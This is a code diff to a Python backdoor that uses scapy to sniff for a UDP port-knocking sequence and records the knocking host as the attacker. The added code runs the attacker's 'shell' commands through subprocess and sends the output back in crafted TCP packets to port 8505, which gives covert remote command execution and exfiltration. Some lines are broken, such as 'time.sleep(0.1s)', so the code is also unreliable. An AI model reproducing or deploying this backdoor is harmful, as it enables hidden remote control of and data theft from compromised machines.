@@ -1,15 +1,18 @@
-#/usr/bin/python3
-import socket, os, sys
+#/usr/bin/python
+
+import socket, os, sys, time, logging
 import setproctitle
 from scapy.all import *
 import config
 
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 code = 0
-targetIP = ""
+attackerIP = ""
+attackerPort = 8505
 
 def portKnocking(packet):
     global code
-    global targetIP
+    global attackerIP
     portKnocks = config.portKnocks
     if IP in packet:
         if UDP in packet:
@@ -23,18 +26,36 @@ def portKnocking(packet):
                 print("{} : Knock 2".format(srcAddr))
             elif srcPort == portKnocks[2] and code == 2:
                 code = 3
-                targetIP = srcAddr
+                attackerIP = srcAddr
                 print("{}: Knock 3. Authetication succeed.".format(srcAddr))
             else:
                 print("Authetication failed (code = 0)")
+def craftPacket(ip, port, data):
+    packet = IP(dst=ip)/TCP(dport=port)/Raw(load=data)
+    return packet
+
+def executeCmd(packet, cmd):
+    print("Executing command: {}".format(cmd))
+    result = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    result = result.stdout.read() + result.stderr.read()
+    packet = craftPacket(attackerIP, attackerPort, result)
+    send(packet)
+    time.sleep(0.1s)
+
 
 def parsePacket(packet):
     if packet.haslayer(IP) and packet.haslayer(Raw):
-        if packet[IP].src != targetIP:
+        if packet[IP].src != attackerIP:
             return
         payload = packet['Raw'].load
         cmdType, cmdString = payload.split(' ')
-    return
+        if cmdType == "shell":
+            executeCmd(packet, cmdString)
+        elif cmdType == "exit":
+            print("Backdoor exited.")
+            sys.exit(0)
+        else:
+            print("Incorrected command")
 
 
 def checkRootPrivilege():
